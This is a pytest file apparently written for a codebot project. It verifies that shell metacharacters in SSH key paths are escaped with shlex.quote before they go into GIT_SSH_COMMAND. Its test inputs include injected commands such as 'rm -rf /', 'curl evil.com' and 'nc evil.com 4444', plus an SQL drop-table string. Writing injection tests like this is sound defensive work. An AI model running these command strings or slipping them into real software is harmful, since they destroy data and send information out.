#!/usr/bin/env python3
"""Security tests for command injection in get_git_ssh_command.

Ticket: CB-8882680-8A40
Verifies that shell metacharacters in SSH key paths are neutralized
via shlex.quote() before interpolation into GIT_SSH_COMMAND.
"""

from __future__ import annotations

import shlex
from pathlib import Path
from unittest.mock import patch

import pytest

from codebot import credentials


class TestGitSshCommandInjection:
    """Verify that get_git_ssh_command is safe against command injection."""

    @pytest.mark.parametrize(
        "malicious_path",
        [
            "/tmp/key;rm -rf /",
            "/tmp/key`whoami`",
            "/tmp/key$(id)",
            "/tmp/key && curl evil.com",
            "/tmp/key | nc evil.com 4444",
            "/tmp/key\nrm -rf /",
            '/tmp/key"; drop table users; --',
        ],
    )
    def test_shell_metacharacters_are_quoted(
        self, monkeypatch, tmp_path, malicious_path
    ):
        """Shell metacharacters in key path must be escaped."""
        # Create a real file at a safe location, but mock get_ssh_key_path
        # to return the malicious path
        mock_path = Path(malicious_path)
        with patch.object(credentials, "get_ssh_key_path", return_value=mock_path):
            cmd = credentials.get_git_ssh_command()

        # The malicious path must appear as a single quoted argument
        quoted = shlex.quote(malicious_path)
        assert quoted in cmd, (
            f"Path not properly quoted.\n"
            f"Expected {quoted!r} in command.\n"
            f"Got: {cmd!r}"
        )
        # Verify no unquoted shell metacharacters leak into the command
        # by checking that splitting the command yields the path as one token
        parts = shlex.split(cmd)
        idx = parts.index("-i")
        assert parts[idx + 1] == malicious_path, (
            f"After shlex.split, -i argument should be the original path.\n"
            f"Got parts[idx+1]={parts[idx + 1]!r}"
        )

    def test_normal_path_still_works(self, monkeypatch, tmp_path):
        """Normal paths without metacharacters still produce valid commands."""
        key = tmp_path / "id_ed25519"
        key.touch()
        monkeypatch.setenv("SSH_PRIVATE_KEY_PATH", str(key))
        cmd = credentials.get_git_ssh_command()
        assert "-i" in cmd
        assert str(key) in cmd
        assert "IdentitiesOnly=yes" in cmd
        assert "StrictHostKeyChecking=accept-new" in cmd

    def test_path_with_spaces_quoted(self, monkeypatch, tmp_path):
        """Paths containing spaces must be quoted to remain a single argument."""
        key_dir = tmp_path / "my keys"
        key_dir.mkdir()
        key = key_dir / "id_rsa"
        key.touch()
        monkeypatch.setenv("SSH_PRIVATE_KEY_PATH", str(key))
        cmd = credentials.get_git_ssh_command()
        quoted = shlex.quote(str(key))
        assert quoted in cmd, f"Space-containing path not quoted: {cmd!r}"
